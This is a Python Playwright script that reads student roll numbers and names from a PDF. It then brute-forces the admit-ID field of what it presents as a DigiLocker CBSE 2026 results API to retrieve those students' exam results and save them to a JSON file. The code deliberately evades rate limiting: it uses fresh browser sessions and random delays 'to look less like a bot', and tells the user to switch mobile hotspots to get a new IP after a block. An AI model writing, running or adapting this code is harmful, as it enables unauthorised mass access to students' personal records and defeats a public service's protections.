import asyncio
import json
import random
import os
from playwright.async_api import async_playwright

# --- CONFIGURATION ---
JSON_PATH = "results_data.json"
PDF_FILE = "PRACTICAL.pdf"
# Processing one by one is slower but much safer from being blocked again
CONCURRENT_STUDENTS = 1  
BATCH_SIZE = 26 
BATCH_DELAY = 1200 

async def rescue_student(browser, student):
    roll = str(student['roll'])
    name = student['name']
    roll_suffix = roll[-2:]
    
    # Create a fresh browser context to mirror a real user session
    context = await browser.new_context()
    page = await context.new_page()
    
    # Speed up the process by blocking images and CSS
    await page.route("**/*.{png,jpg,jpeg,css,svg,woff2}", lambda route: route.abort())
    
    try:
        print(f"🔎 Scanning: {name} ({roll})")
        # Navigate to the result page first to establish a session (important for headers)
        await page.goto("https://results.digilocker.gov.in/CBSE12th2026resultXIInruew.html", wait_until="domcontentloaded")
        
        # Inject the exact fetch logic from your content.js
        result = await page.evaluate(f"""async () => {{
            const roll = "{roll}";
            const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
            const endpoint = "https://results.digilocker.gov.in/api/cbse/hscer/results";
            
            const tryID = async (id) => {{
                try {{
                    const res = await fetch(endpoint, {{
                        method: "POST",
                        headers: {{
                            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "X-Requested-With": "XMLHttpRequest",
                            "Accept": "application/json, text/javascript, */*; q=0.01"
                        }},
                        body: `rroll=${{roll}}&year=2026&admn_id=${{id}}`
                    }});
                    if (res.status === 429) return "LIMIT";
                    const data = await res.json();
                    // Validation: check if the roll number in the data matches
                    if (res.status === 200 && data && data.RROLL == roll && !data.error) return data;
                    return null;
                }} catch(e) {{ return null; }}
            }};

            // Double letter brute force loop (AA to ZZ)
            for (let i = 0; i < 676; i += {BATCH_SIZE}) {{
                const batch = [];
                for (let j = 0; j < {BATCH_SIZE} && (i + j) < 676; j++) {{
                    const idx = i + j;
                    const pre = alphabet[Math.floor(idx / 26)] + alphabet[idx % 26];
                    const admitID = pre + "{roll_suffix}" + "4090";
                    batch.push(tryID(admitID));
                }}

                const results = await Promise.all(batch);
                for (const r of results) {{
                    if (r === "LIMIT") return "LIMIT";
                    if (r) return r;
                }}
                await new Promise(r => setTimeout(r, {BATCH_DELAY}));
            }}
            return null;
        }}""")

        await context.close()
        return result
    except Exception as e:
        print(f"⚠️ Error during scanning: {e}")
        await context.close()
        return None

async def main():
    import pdfplumber
    missing = []
    
    # 1. Load all students from PDF
    with pdfplumber.open(PDF_FILE) as pdf:
        for page in pdf.pages[3:]:
            table = page.extract_table()
            if table:
                for row in table[1:]:
                    if row and len(row) >= 3:
                        r = str(row[1]).strip().replace("\n", "")
                        n = str(row[2]).strip().replace("\n", " ")
                        if r.isdigit() and len(r) == 8:
                            missing.append({"roll": r, "name": n})

    # 2. Check which ones are already in your results_data.json
    try:
        with open(JSON_PATH, 'r', encoding='utf-8') as f:
            data = json.load(f)
        scraped_rolls = {str(item.get('data', item).get('RROLL')).strip() for item in data if item}
    except:
        scraped_rolls = set()

    to_rescue = [s for s in missing if s['roll'] not in scraped_rolls]
    print(f"🏁 Starting rescue for {len(to_rescue)} missing students...")

    async with async_playwright() as p:
        # Use headless=True for speed, or False if you want to watch the browser
        browser = await p.chromium.launch(headless=True)
        
        for s in to_rescue:
            res = await rescue_student(browser, s)
            
            if res == "LIMIT":
                print("🛑 Rate Limit reached. Please toggle your mobile hotspot and restart the script.")
                break
            
            if res:
                # 3. Add to JSON immediately after finding a student
                try:
                    if os.path.exists(JSON_PATH):
                        with open(JSON_PATH, 'r', encoding='utf-8') as f:
                            current_list = json.load(f)
                    else:
                        current_list = []
                    
                    current_list.append({"data": res})
                    
                    with open(JSON_PATH, 'w', encoding='utf-8') as f:
                        json.dump(current_list, f, indent=4)
                    print(f"✅ SAVED: {s['name']}")
                except Exception as e:
                    print(f"❌ Failed to save {s['name']}: {e}")
            else:
                print(f"❌ NOT FOUND: {s['name']}")
            
            # Small random delay between students to look less like a bot
            await asyncio.sleep(random.uniform(2, 4))

        await browser.close()

if __name__ == "__main__":
    asyncio.run(main())